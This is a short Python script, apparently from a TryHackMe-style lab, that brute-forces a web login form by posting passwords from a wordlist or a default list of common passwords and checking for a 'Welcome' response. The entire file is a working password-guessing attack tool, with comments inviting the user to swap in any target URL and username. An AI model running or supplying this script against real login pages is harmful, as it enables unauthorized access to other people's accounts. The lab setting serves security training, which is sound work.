import requests

login_url = "http://python.thm/labs/lab1/index.php" # replace it with target URL

username = "admin" # Replace it with target username

wordlist_file = "" # OPTIONAL: Replace it with your word list file

def brute_force_login(LOGIN_URL, USERNAME):
    """Brute forces the login panel."""
    session = requests.Session()

    try:
        with open(wordlist_file, "r") as file:
            wordlist = file.read().split()
        print("Using your wordlist")

    except:
        print("Word list not detected or invalid file path, using default word list.")
        wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None

brute_force_login(login_url, username)